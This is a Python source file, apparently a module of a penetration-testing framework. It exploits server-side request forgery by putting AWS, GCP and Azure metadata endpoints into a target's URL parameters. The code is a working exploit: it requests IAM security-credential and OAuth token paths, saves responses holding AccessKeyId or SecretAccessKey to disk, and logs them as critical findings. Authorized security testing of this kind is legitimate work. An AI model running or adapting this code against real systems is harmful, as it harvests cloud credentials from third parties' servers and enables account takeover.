"""ssrf_dump — extract cloud metadata via SSRF"""
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from pathlib import Path

# AWS
AWS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/instance-type",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/hostname",
    "/latest/meta-data/iam/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
    "/latest/dynamic/instance-identity/document",
]
# GCP
GCP_PATHS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/service-accounts/",
    "/computeMetadata/v1/instance/attributes/",
]
# Azure
AZURE_PATHS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
]

SERVICES = {
    "aws":   ("http://169.254.169.254", AWS_PATHS),
    "gcp":   ("http://metadata.google.internal", GCP_PATHS),
    "azure": ("http://169.254.169.254", AZURE_PATHS),
}

class SsrfDump:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"url": ["http://example.com"]}

        out_dir = Path("reports") / "dump" / "ssrf"
        out_dir.mkdir(parents=True, exist_ok=True)
        dumped = {}

        for name, param in [(n, None) for n in params]:
            for svc, (base, paths) in SERVICES.items():
                for path in paths:
                    url = base + path
                    q = dict(params); q[name] = [url]
                    new_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                    headers = {"Metadata-Flavor":"Google"} if svc == "gcp" else {}
                    r = http.get(new_url, headers=headers)
                    if not r or r.status_code != 200: continue
                    body = r.text
                    # check for metadata markers
                    if any(m in body for m in ["ami-","i-0","AccessKeyId","SecretAccessKey",
                                                "service-accounts","project-id","computeMetadata",
                                                "instance-id","vmId"]):
                        key = f"{svc}_{path.replace('/','_')}"
                        (out_dir / key).write_text(body[:10000])
                        dumped[key] = len(body)
                        print(f"  [+] {svc}{path} -> {len(body)}b")
                        logger.finding("ssrf_metadata", "critical", f"{svc} {path}")
                        # extract credentials
                        if "AccessKeyId" in body:
                            logger.finding("aws_creds", "critical", "AWS keys exposed")

        print(f"[ssrf_dump] {len(dumped)} items saved")
        return {"dumped": list(dumped.keys())}
